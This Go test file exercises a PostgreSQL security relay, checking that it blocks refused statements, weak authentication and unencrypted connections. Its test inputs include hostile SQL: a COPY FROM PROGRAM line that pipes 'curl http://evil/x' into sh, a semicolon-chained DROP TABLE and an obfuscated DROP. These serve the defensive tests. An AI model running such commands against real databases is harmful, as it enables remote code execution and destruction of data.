package postgres

import (
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/config"
	"github.com/rom/xproxy/internal/logging"
	wire "github.com/rom/xproxy/internal/pgwire"
	"github.com/rom/xproxy/internal/proxy"
	"github.com/rom/xproxy/internal/proxytest"
)

// fakeServer is a PostgreSQL server: enough of one to complete a startup and to
// record every statement that reached it.
//
// What got through is the assertion that matters on a security relay -- not
// what the client was told. A test that checked only the client's error would
// pass against a relay that refused the client and forwarded the statement
// anyway.
type fakeServer struct {
	ln net.Listener

	mu sync.Mutex
	// statements is every Query and Parse the server saw, in order.
	statements []string
	// startups is every startup packet's parameters.
	startups []map[string]string
	// sslAsked and sslAnswer record the upstream negotiation, because the leg
	// to the server is a decision of its own.
	sslAsked  int
	sslAnswer byte
	// sslCfg is the certificate this fake serves once it has answered the
	// request with 'S'. Without it an answer of 'S' is a server that offered
	// an upgrade it cannot perform, which is its own test.
	sslCfg *tls.Config
	// authRequest is the authentication method the server asks for.
	authRequest int32
	cancels     int
}

func startFake(t *testing.T, s *fakeServer) *fakeServer {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	s.ln = ln
	if s.sslAnswer == 0 {
		// The relay's upstream leg defaults to require, and this fake speaks no
		// TLS, so the tests that do not care set disable and this answer is
		// never reached. A fake that answered 'S' and then could not handshake
		// would fail in a way that looks like the relay's fault.
		s.sslAnswer = wire.DenyTLS
	}
	if s.authRequest == 0 {
		s.authRequest = wire.AuthOK
	}
	t.Cleanup(func() { _ = ln.Close() })
	go s.serve()
	return s
}

func (s *fakeServer) addr() string { return s.ln.Addr().String() }

func (s *fakeServer) serve() {
	for {
		c, err := s.ln.Accept()
		if err != nil {
			return
		}
		go s.session(c)
	}
}

func (s *fakeServer) session(c net.Conn) {
	defer func() { _ = c.Close() }()
	rd := wire.NewReader(c, wire.FromClient, 0)
	for {
		st, _, err := rd.ReadStartup()
		if err != nil {
			return
		}
		switch st.Code {
		case wire.SSLRequest:
			s.mu.Lock()
			s.sslAsked++
			ans, cfg := s.sslAnswer, s.sslCfg
			s.mu.Unlock()
			if _, err := c.Write([]byte{ans}); err != nil {
				return
			}
			if ans == wire.AllowTLS && cfg != nil {
				tc := tls.Server(c, cfg)
				if err := tc.Handshake(); err != nil {
					return
				}
				c, rd = tc, wire.NewReader(tc, wire.FromClient, 0)
			}
			continue
		case wire.CancelRequest:
			s.mu.Lock()
			s.cancels++
			s.mu.Unlock()
			return
		case wire.Version3:
			params := map[string]string{}
			for _, p := range st.Params {
				params[p.Key] = p.Value
			}
			s.mu.Lock()
			s.startups = append(s.startups, params)
			auth := s.authRequest
			s.mu.Unlock()
			if auth != wire.AuthOK {
				// Ask, then accept whatever comes back: this fake is not
				// checking credentials, it is exercising the relay's reading
				// of the request.
				body := binary.BigEndian.AppendUint32(nil, uint32(auth)) //nolint:gosec // a constant
				if _, err := c.Write(frame(wire.MsgAuthentication, body)); err != nil {
					return
				}
				if _, err := rd.Next(); err != nil {
					return
				}
			}
			if !s.ready(c) {
				return
			}
			s.loop(c, rd)
			return
		}
		return
	}
}

// ready sends what a server sends once a connection is authenticated.
func (s *fakeServer) ready(c net.Conn) bool {
	ok := binary.BigEndian.AppendUint32(nil, uint32(wire.AuthOK))
	msgs := [][]byte{
		frame(wire.MsgAuthentication, ok),
		frame(wire.MsgBackendKeyData, []byte{0, 0, 0x30, 0x39, 0x11, 0x22, 0x33, 0x44}),
		wire.ReadyForQuery('I'),
	}
	for _, m := range msgs {
		if _, err := c.Write(m); err != nil {
			return false
		}
	}
	return true
}

// loop reads statements and answers each one so a client is not left waiting.
func (s *fakeServer) loop(c net.Conn, rd *wire.Reader) {
	for {
		m, err := rd.Next()
		if err != nil {
			return
		}
		switch m.Type {
		case wire.MsgQuery:
			text, _ := m.QueryText()
			s.record(text)
			_, _ = c.Write(frame(wire.MsgCommandComplete, []byte("SELECT 1\x00")))
			_, _ = c.Write(wire.ReadyForQuery('I'))
		case wire.MsgParse:
			if p, err := m.ReadParse(); err == nil {
				s.record(p.Statement)
			}
			_, _ = c.Write(frame('1', nil))
		case wire.MsgSync:
			_, _ = c.Write(wire.ReadyForQuery('I'))
		case wire.MsgTerminate:
			return
		}
	}
}

func (s *fakeServer) record(text string) {
	s.mu.Lock()
	s.statements = append(s.statements, text)
	s.mu.Unlock()
}

func (s *fakeServer) got() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]string(nil), s.statements...)
}

func (s *fakeServer) sawStartups() []map[string]string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]map[string]string(nil), s.startups...)
}

// frame builds one wire message.
func frame(typ byte, body []byte) []byte {
	out := make([]byte, 5, 5+len(body))
	out[0] = typ
	binary.BigEndian.PutUint32(out[1:5], uint32(len(body)+4)) //nolint:gosec // test data
	return append(out, body...)
}

const pgYAML = `
version: 1
server:
  listeners:
    - name: db
      address: "127.0.0.1:0"
      kind: postgres
      postgres:
%s
logging: {access: {enabled: false}}
upstreams:
  - {name: pg, endpoints: [{address: %q}]}
`

// relayFor starts a relay in front of the fake. Every test here sets
// require_tls false and upstream_tls_mode disable, because what is under test
// is the policy and the framing rather than Go's TLS stack -- the negotiation
// itself has its own tests below.
func relayFor(t *testing.T, section, serverAddr string) (*proxy.Server, string) {
	t.Helper()
	s := proxytest.Start(t, fmt.Sprintf(pgYAML, section, serverAddr))
	return s, proxytest.Addr(t, s, "db")
}

const base = "        upstream: pg\n" +
	"        require_tls: false\n" +
	"        upstream_tls_mode: disable\n" +
	"        default_action: allow\n"

// client is a minimal PostgreSQL client: enough to connect and send statements.
type client struct {
	c  net.Conn
	rd *wire.Reader
}

func dial(t *testing.T, addr string, kv ...string) *client {
	t.Helper()
	c, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = c.Close() })
	_ = c.SetDeadline(time.Now().Add(10 * time.Second))
	cl := &client{c: c, rd: wire.NewReader(c, wire.FromServer, 0)}
	if _, err := c.Write(startupPacket(kv...)); err != nil {
		t.Fatal(err)
	}
	return cl
}

func startupPacket(kv ...string) []byte {
	body := make([]byte, 0, 64)
	for _, s := range kv {
		body = append(body, s...)
		body = append(body, 0)
	}
	body = append(body, 0)
	out := make([]byte, 8, 8+len(body))
	binary.BigEndian.PutUint32(out[:4], uint32(8+len(body)))
	binary.BigEndian.PutUint32(out[4:8], wire.Version3)
	return append(out, body...)
}

// waitReady reads until ReadyForQuery, or reports the fatal error instead.
func (cl *client) waitReady(t *testing.T) (fatal string) {
	t.Helper()
	for {
		m, err := cl.rd.Next()
		if err != nil {
			return "connection closed: " + err.Error()
		}
		switch m.Type {
		case wire.MsgReadyForQuery:
			return ""
		case wire.MsgErrorResponse:
			f, _ := m.ReadError()
			return wire.ErrorText(f)
		case wire.MsgAuthentication:
			// A real client answers the challenge. It matters that the test one
			// does too: a fake server left waiting for a password looks exactly
			// like a relay that stopped forwarding.
			if code, err := m.AuthRequest(); err == nil && code != wire.AuthOK {
				if _, err := cl.c.Write(frame(wire.MsgPasswordMessage, []byte("secret\x00"))); err != nil {
					return "write failed: " + err.Error()
				}
			}
		}
	}
}

// query sends a statement and returns the error text, or "" when it went
// through.
func (cl *client) query(t *testing.T, sql string) string {
	t.Helper()
	body := append([]byte(sql), 0)
	if _, err := cl.c.Write(frame(wire.MsgQuery, body)); err != nil {
		return "write failed: " + err.Error()
	}
	var errText string
	for {
		m, err := cl.rd.Next()
		if err != nil {
			if errText != "" {
				return errText
			}
			return "connection closed"
		}
		switch m.Type {
		case wire.MsgErrorResponse:
			f, _ := m.ReadError()
			errText = wire.ErrorText(f)
		case wire.MsgReadyForQuery:
			return errText
		}
	}
}

// An ordinary connection and an ordinary statement go through, and the server
// sees both.
func TestTheOrdinaryConnectionGoesThroughAndTheServerSeesIt(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base, fake.addr())
	cl := dial(t, addr, "user", "alice", "database", "sales", "application_name", "psql")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("startup: %s", e)
	}
	if e := cl.query(t, "SELECT 1"); e != "" {
		t.Fatalf("select: %s", e)
	}
	if got := fake.got(); len(got) != 1 || got[0] != "SELECT 1" {
		t.Fatalf("the server saw %q", got)
	}
	// The startup packet reached the server as the octets the client sent,
	// parameters and order intact.
	ss := fake.sawStartups()
	if len(ss) != 1 || ss[0]["user"] != "alice" || ss[0]["database"] != "sales" ||
		ss[0]["application_name"] != "psql" {
		t.Fatalf("startup: %+v", ss)
	}
}

// The assertion that matters: a refused statement must not reach the server.
func TestARefusedStatementNeverReachesTheServer(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        read_only: true\n", fake.addr())
	cl := dial(t, addr, "user", "alice")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("startup: %s", e)
	}
	e := cl.query(t, "DROP TABLE users")
	if !strings.Contains(e, "read_only") {
		t.Fatalf("the client was told %q", e)
	}
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("the statement got through: %q", got)
	}
	// The connection is still usable: refusing one statement must not end the
	// session, or an application retries the whole transaction.
	if e = cl.query(t, "SELECT 1"); e != "" {
		t.Fatalf("the connection was unusable after a refusal: %s", e)
	}
	if got := fake.got(); len(got) != 1 || got[0] != "SELECT 1" {
		t.Fatalf("after the refusal the server saw %q", got)
	}
}

// A semicolon is how an injection is delivered, and the second half must not
// cross just because the first half was allowed.
func TestTheSecondStatementAfterASemicolonIsDecidedToo(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        read_only: true\n", fake.addr())
	cl := dial(t, addr, "user", "alice")
	_ = cl.waitReady(t)
	if e := cl.query(t, "SELECT 1; DROP TABLE users"); e == "" {
		t.Fatal("a select-then-drop was allowed")
	}
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("the message got through: %q", got)
	}
}

// COPY ... FROM PROGRAM is the one statement that is unambiguously remote code
// execution, and no configuration lets it through.
func TestCopyFromProgramNeverReachesTheServer(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        allow_copy: [in, out, file]\n", fake.addr())
	cl := dial(t, addr, "user", "alice")
	_ = cl.waitReady(t)
	if e := cl.query(t, "COPY t FROM PROGRAM 'curl http://evil/x | sh'"); e == "" {
		t.Fatal("copy from program was allowed")
	}
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("it got through: %q", got)
	}
}

// A statement the classifier cannot read is refused, and the refusal names the
// verb so somebody can act on it.
func TestAnUnreadableStatementIsRefusedAndNamed(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base, fake.addr())
	cl := dial(t, addr, "user", "alice")
	_ = cl.waitReady(t)
	e := cl.query(t, "DR/**/OP TABLE users")
	if !strings.Contains(e, "statement_unreadable") {
		t.Fatalf("the client was told %q", e)
	}
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("it got through: %q", got)
	}
}

// The extended query protocol is what every driver sends, so a relay that read
// only Query would inspect nothing.
func TestAStatementSentAsAParseIsDecided(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        read_only: true\n", fake.addr())
	cl := dial(t, addr, "user", "alice")
	_ = cl.waitReady(t)
	// Parse, then Sync so the client is answered.
	body := append([]byte("st1\x00DELETE FROM users\x00"), 0, 0)
	if _, err := cl.c.Write(frame(wire.MsgParse, body)); err != nil {
		t.Fatal(err)
	}
	if _, err := cl.c.Write(frame(wire.MsgSync, nil)); err != nil {
		t.Fatal(err)
	}
	var sawError bool
	for i := 0; i < 8; i++ {
		m, err := cl.rd.Next()
		if err != nil {
			break
		}
		if m.Type == wire.MsgErrorResponse {
			sawError = true
		}
		if m.Type == wire.MsgReadyForQuery {
			break
		}
	}
	if !sawError {
		t.Error("a Parse carrying a DELETE was not refused")
	}
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("the parse got through: %q", got)
	}
}

// A connection that will not encrypt is refused before its identity is read,
// because the identity is inside the packet it would send next.
func TestAClientThatWillNotEncryptIsRefused(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	// require_tls with a certificate: proxytest gives the listener none, so the
	// listener must refuse to load rather than serve in the clear. That is the
	// honest failure, and it is asserted here because the alternative -- a
	// listener that silently serves plaintext -- is the bug.
	yaml := fmt.Sprintf(pgYAML, "        upstream: pg\n        require_tls: true\n", fake.addr())
	cfg, err := config.Parse([]byte(yaml))
	if err == nil {
		_, err = proxy.New(cfg, logging.Discard())
	}
	if err == nil {
		t.Fatal("a listener requiring tls loaded without a certificate")
	}
	if !strings.Contains(err.Error(), "require_tls") {
		t.Fatalf("the error does not say why: %v", err)
	}
}

// A replication connection is refused at the startup packet, where no statement
// policy would ever have seen it.
func TestAReplicationConnectionIsRefusedAtTheStartupPacket(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base, fake.addr())
	cl := dial(t, addr, "user", "repl", "replication", "true")
	if e := cl.waitReady(t); e == "" {
		t.Fatal("a replication connection was admitted")
	}
	if ss := fake.sawStartups(); len(ss) != 0 {
		t.Fatalf("the startup packet reached the server: %+v", ss)
	}
}

// The relay reads the server's authentication request, which is where
// pg_hba.conf's decision becomes visible.
func TestAWeakAuthenticationMethodEndsTheConnection(t *testing.T) {
	fake := startFake(t, &fakeServer{authRequest: wire.AuthMD5Password})
	_, addr := relayFor(t, base, fake.addr())
	cl := dial(t, addr, "user", "alice")
	if e := cl.waitReady(t); !strings.Contains(e, "weak_auth") {
		t.Fatalf("the client was told %q", e)
	}
	// And with it allowed, the same exchange completes.
	fake2 := startFake(t, &fakeServer{authRequest: wire.AuthMD5Password})
	_, addr2 := relayFor(t, base+"        allow_weak_auth: true\n", fake2.addr())
	cl2 := dial(t, addr2, "user", "alice")
	if e := cl2.waitReady(t); e != "" {
		t.Fatalf("allow_weak_auth did not take effect: %s", e)
	}
}

// A statement before the server has said AuthenticationOk is refused: there is
// no legitimate one, and forwarding it asks the database to run something for a
// connection it has not agreed to serve.
func TestAStatementBeforeAuthenticationIsRefused(t *testing.T) {
	fake := startFake(t, &fakeServer{authRequest: wire.AuthSASL})
	_, addr := relayFor(t, base, fake.addr())
	c, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = c.Close() }()
	_ = c.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err = c.Write(startupPacket("user", "alice")); err != nil {
		t.Fatal(err)
	}
	// Do not answer the authentication request; send a statement instead.
	if _, err = c.Write(frame(wire.MsgQuery, append([]byte("SELECT 1"), 0))); err != nil {
		t.Fatal(err)
	}
	// Read until the connection ends.
	_, _ = io.Copy(io.Discard, c)
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("a statement before authentication reached the server: %q", got)
	}
}

// Shadow mode forwards what it would have refused, and still refuses the hard
// shapes: relaying remote code execution and writing it down is not a trial.
func TestShadowModeForwardsPolicyAndStillRefusesTheHardShapes(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        read_only: true\n        monitor_only: true\n", fake.addr())
	cl := dial(t, addr, "user", "alice")
	_ = cl.waitReady(t)
	// A soft refusal is carried.
	if e := cl.query(t, "DELETE FROM users"); e != "" {
		t.Fatalf("shadow mode refused a soft decision: %s", e)
	}
	if got := fake.got(); len(got) != 1 || got[0] != "DELETE FROM users" {
		t.Fatalf("shadow mode did not forward: %q", got)
	}
	// A hard one is not.
	if e := cl.query(t, "COPY t FROM PROGRAM 'id'"); e == "" {
		t.Fatal("shadow mode forwarded copy from program")
	}
	if got := fake.got(); len(got) != 1 {
		t.Fatalf("copy from program got through in shadow mode: %q", got)
	}
}

// deny_response drop closes without a word, for an estate that would rather a
// prober learn nothing.
func TestDropClosesWithoutAnAnswer(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        read_only: true\n        deny_response: drop\n", fake.addr())
	cl := dial(t, addr, "user", "alice")
	_ = cl.waitReady(t)
	body := append([]byte("DROP TABLE users"), 0)
	if _, err := cl.c.Write(frame(wire.MsgQuery, body)); err != nil {
		t.Fatal(err)
	}
	_ = cl.c.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	if m, err := cl.rd.Next(); err == nil && m.Type == wire.MsgErrorResponse {
		t.Fatal("drop answered with an error")
	}
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("it got through: %q", got)
	}
}

// The client list is the first thing checked, before a single octet of the
// startup packet is read.
func TestAClientOutsideTheListNeverReachesTheServer(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	_, addr := relayFor(t, base+"        allow_clients: [\"192.0.2.0/24\"]\n", fake.addr())
	cl := dial(t, addr, "user", "alice")
	if e := cl.waitReady(t); e == "" {
		t.Fatal("a client outside the list was admitted")
	}
	if ss := fake.sawStartups(); len(ss) != 0 {
		t.Fatalf("the startup packet got through: %+v", ss)
	}
}

// The upstream leg's TLS requirement is a decision of its own: a relay that
// terminated TLS from the client and spoke plaintext onward would have moved
// the exposure rather than removed it.
func TestAServerThatRefusesTLSIsRefusedWhenTheModeRequiresIt(t *testing.T) {
	fake := startFake(t, &fakeServer{sslAnswer: wire.DenyTLS})
	section := "        upstream: pg\n        require_tls: false\n" +
		"        upstream_tls_mode: require\n        default_action: allow\n"
	_, addr := relayFor(t, section, fake.addr())
	cl := dial(t, addr, "user", "alice")
	if e := cl.waitReady(t); e == "" {
		t.Fatal("a server that refused tls was used anyway")
	}
	fake.mu.Lock()
	asked := fake.sslAsked
	fake.mu.Unlock()
	if asked == 0 {
		t.Fatal("the relay never asked the server for tls")
	}
	if ss := fake.sawStartups(); len(ss) != 0 {
		t.Fatalf("a startup packet crossed an unencrypted leg: %+v", ss)
	}
}

// A rule widens the listener for its own traffic, end to end.
func TestARuleWidensTheListenerForItsOwnUser(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	section := base + "        read_only: true\n" +
		"        rules:\n" +
		"          - name: migrations\n" +
		"            users: [migrator]\n" +
		"            read_only: false\n" +
		"            allow_statements: [ddl, select]\n"
	_, addr := relayFor(t, section, fake.addr())

	reporting := dial(t, addr, "user", "reporting")
	_ = reporting.waitReady(t)
	if e := reporting.query(t, "DROP TABLE users"); e == "" {
		t.Fatal("the reporting account was allowed ddl")
	}

	migrator := dial(t, addr, "user", "migrator")
	_ = migrator.waitReady(t)
	if e := migrator.query(t, "DROP TABLE users"); e != "" {
		t.Fatalf("the migration account was refused ddl: %s", e)
	}
	got := fake.got()
	if len(got) != 1 || got[0] != "DROP TABLE users" {
		t.Fatalf("the server saw %q", got)
	}
}
